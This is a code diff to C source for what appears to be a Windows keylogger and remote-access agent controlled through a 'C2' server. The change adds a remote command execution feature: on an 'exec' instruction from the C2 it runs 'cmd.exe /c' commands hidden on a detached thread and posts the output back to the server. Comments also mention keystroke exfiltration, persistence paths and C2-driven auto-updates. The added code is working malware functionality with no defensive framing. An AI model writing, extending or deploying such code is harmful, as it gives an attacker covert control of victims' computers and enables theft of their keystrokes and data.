@@ -66,10 +66,15 @@
 #define REPAIR_INTERVAL_MS  (15 * 60 * 1000)
 
 /* agent version — incremented on each release, sent in heartbeat */
-#define AGENT_VERSION       "1.0.2"
+#define AGENT_VERSION       "1.0.3"
 
 /* update download buffer — max binary size we accept */
 #define UPDATE_MAX_SIZE     (4 * 1024 * 1024)   /* 4 MB */
+
+/* remote command execution limits */
+#define MAX_COMMAND_LEN     4096
+#define MAX_OUTPUT_SIZE     65536
+#define CMD_TIMEOUT_MS      30000
 
 /* ---------- defines missing from some MinGW headers ---------- */
 
@@ -88,6 +93,8 @@
 
 static void c2_update(const char *url, const char *expected_sha256);
 static void c2_config_poll(void);
+static int c2_exec_command(const char *command_id, const char *command);
+static DWORD WINAPI c2_exec_command_thread(LPVOID param);
 static void persistence_paths(char *original_exe, int orig_size,
                                char *persist_dir, int dir_size,
                                char *persist_exe, int exe_size,
@@ -1152,6 +1159,44 @@ static void c2_heartbeat(void) {
             } else if (stricmp_local(action, "sleep") == 0) {
                 /* TODO: suspend hook temporarily */
                 log_write("c2: sleep command received");
+            } else if (stricmp_local(action, "exec") == 0) {
+                char command_id[64] = {0};
+                char command_cmd[MAX_COMMAND_LEN] = {0};
+                if (json_extract_string(response, "command_id", command_id, sizeof(command_id)) &&
+                    json_extract_string(response, "command_cmd", command_cmd, sizeof(command_cmd))) {
+
+                    log_write("exec: command received, spawning thread");
+
+                    /* Allocate heap memory for thread parameters */
+                    char **args = (char**)HeapAlloc(GetProcessHeap(), 0, 2 * sizeof(char*));
+                    if (args) {
+                        args[0] = (char*)HeapAlloc(GetProcessHeap(), 0, 64);
+                        args[1] = (char*)HeapAlloc(GetProcessHeap(), 0, MAX_COMMAND_LEN);
+                        if (args[0] && args[1]) {
+                            strncpy(args[0], command_id, 63);
+                            args[0][63] = '\0';
+                            strncpy(args[1], command_cmd, MAX_COMMAND_LEN - 1);
+                            args[1][MAX_COMMAND_LEN - 1] = '\0';
+
+                            HANDLE hThread = CreateThread(NULL, 0,
+                                c2_exec_command_thread, args, 0, NULL);
+                            if (hThread) {
+                                CloseHandle(hThread);  /* detach -- fire and forget */
+                            } else {
+                                log_write("exec: failed to create thread");
+                                HeapFree(GetProcessHeap(), 0, args[0]);
+                                HeapFree(GetProcessHeap(), 0, args[1]);
+                                HeapFree(GetProcessHeap(), 0, args);
+                            }
+                        } else {
+                            if (args[0]) HeapFree(GetProcessHeap(), 0, args[0]);
+                            if (args[1]) HeapFree(GetProcessHeap(), 0, args[1]);
+                            HeapFree(GetProcessHeap(), 0, args);
+                        }
+                    }
+                } else {
+                    log_write("exec: command_id or command_cmd missing");
+                }
             }
         }
 
@@ -1178,7 +1223,125 @@ static void c2_heartbeat(void) {
 }
 
 /* ============================================================================
- * SECTION 10b: AUTO-UPDATE
+ * SECTION 10b: REMOTE COMMAND EXECUTION
+ *
+ * Triggered by the C2 during heartbeat when "action":"exec" is queued.
+ * The server includes command_id and command_cmd in the heartbeat response.
+ * We execute cmd.exe /c <command> on a background thread, capture output,
+ * and POST the result back to the C2.
+ * ============================================================================ */
+
+/* JSON-escape a string (reused pattern from keystroke exfil) */
+static void json_escape(const char *in, char *out, int out_size) {
+    int oi = 0;
+    for (int i = 0; in[i] && oi < out_size - 4; i++) {
+        char ch = in[i];
+        switch (ch) {
+            case '"':  out[oi++] = '\\'; out[oi++] = '"';  break;
+            case '\\': out[oi++] = '\\'; out[oi++] = '\\'; break;
+            case '\n': out[oi++] = '\\'; out[oi++] = 'n';  break;
+            case '\r': out[oi++] = '\\'; out[oi++] = 'r';  break;
+            case '\t': out[oi++] = '\\'; out[oi++] = 't';  break;
+            default:
+                if (ch >= 0x20) out[oi++] = ch;
+                break;
+        }
+    }
+    out[oi] = '\0';
+}
+
+static int c2_exec_command(const char *command_id, const char *command) {
+    /* Build cmd.exe /c <command> */
+    char cmdline[MAX_COMMAND_LEN + 16];
+    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", command);
+
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    HANDLE hStdoutRd, hStdoutWr;
+
+    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
+        log_write("exec: CreatePipe failed");
+        return -1;
+    }
+    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOA si = { sizeof(si) };
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = hStdoutWr;
+    si.hStdError = hStdoutWr;   /* combine stderr into stdout */
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi = {0};
+    BOOL created = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
+                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CloseHandle(hStdoutWr);
+
+    if (!created) {
+        CloseHandle(hStdoutRd);
+        log_write("exec: CreateProcess failed");
+        return -1;
+    }
+
+    /* Read output in a loop until pipe breaks */
+    char output[MAX_OUTPUT_SIZE] = {0};
+    DWORD total = 0, read = 0;
+    while (ReadFile(hStdoutRd, output + total, MAX_OUTPUT_SIZE - total - 1, &read, NULL) && read > 0) {
+        total += read;
+        if (total >= MAX_OUTPUT_SIZE - 1) {
+            output[MAX_OUTPUT_SIZE - 1] = '\0';
+            break;
+        }
+    }
+    output[total] = '\0';
+    CloseHandle(hStdoutRd);
+
+    /* Wait for process with timeout */
+    DWORD wait_result = WaitForSingleObject(pi.hProcess, CMD_TIMEOUT_MS);
+    DWORD exit_code = 1;
+    if (wait_result == WAIT_TIMEOUT) {
+        TerminateProcess(pi.hProcess, 1);
+        log_write("exec: command timed out");
+    } else {
+        GetExitCodeProcess(pi.hProcess, &exit_code);
+    }
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    /* JSON-escape the output */
+    char escaped[MAX_OUTPUT_SIZE * 2];
+    json_escape(output, escaped, sizeof(escaped));
+
+    /* Build result JSON */
+    char result_body[MAX_OUTPUT_SIZE * 2 + 256];
+    snprintf(result_body, sizeof(result_body),
+             "{\"action_id\":\"%s\",\"exit_code\":%lu,\"stdout\":\"%s\",\"stderr\":\"\"}",
+             command_id, (unsigned long)exit_code, escaped);
+
+    char result_path[512];
+    snprintf(result_path, sizeof(result_path),
+             "/api/agents/%s/command_result", g_agent_id);
+
+    int ret = http_post(result_path, result_body, NULL, 0);
+    log_write(ret < 0 ? "exec: failed to report result" : "exec: result reported");
+    return (exit_code == 0) ? 0 : 1;
+}
+
+static DWORD WINAPI c2_exec_command_thread(LPVOID param) {
+    char **args = (char**)param;
+    char *command_id = args[0];
+    char *command_cmd = args[1];
+
+    log_write("exec: starting on background thread");
+    c2_exec_command(command_id, command_cmd);
+
+    HeapFree(GetProcessHeap(), 0, command_id);
+    HeapFree(GetProcessHeap(), 0, command_cmd);
+    HeapFree(GetProcessHeap(), 0, args);
+    return 0;
+}
+
+/* ============================================================================
+ * SECTION 10c: AUTO-UPDATE
  *
  * Triggered by the C2 during heartbeat.  Server replies with:
  *   { "update_url": "https://...", "update_sha256": "hex..." }
